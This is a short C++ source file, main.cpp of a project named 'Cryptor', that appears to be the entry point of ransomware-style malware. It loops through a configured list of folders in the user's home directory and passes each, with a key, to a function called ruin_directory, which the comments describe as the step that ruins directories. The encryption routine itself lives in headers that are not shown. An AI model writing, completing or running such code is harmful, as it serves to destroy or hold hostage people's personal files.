//
//  main.cpp
//  Cryptor
//
//  Created by MshRoom2290 on 10/23/25.
//

#include <iostream>
#include "headers/cryptor.h"
#include "headers/config.h"
#include "headers/banners.h"

int main(int argc, const char * argv[]) {
    /* 
    * Define the user home directory
    *
    * Try and identify the operating system the user is running. If the
    * the user runs windows, the file path separator is '\'. Linux and
    * macOS uses '/'
    *
    * 1.) Iterate through list of directories (after definition)
    * 2.) Are those directories valid?
    * 3.) RUin directories
    */
   
    for (const std::string& dir : directories) {
        cryptor::fs::path dir_path(std::string(homeDir) + dir);

        if (!cryptor::fs::exists(dir_path) || !cryptor::fs::is_directory(dir_path)) {
            banners::print_error({"Invalid directory...", dir});
            continue; // Skip invalid directories
        }

        cryptor::ruin_directory(dir_path, key);
    }
}

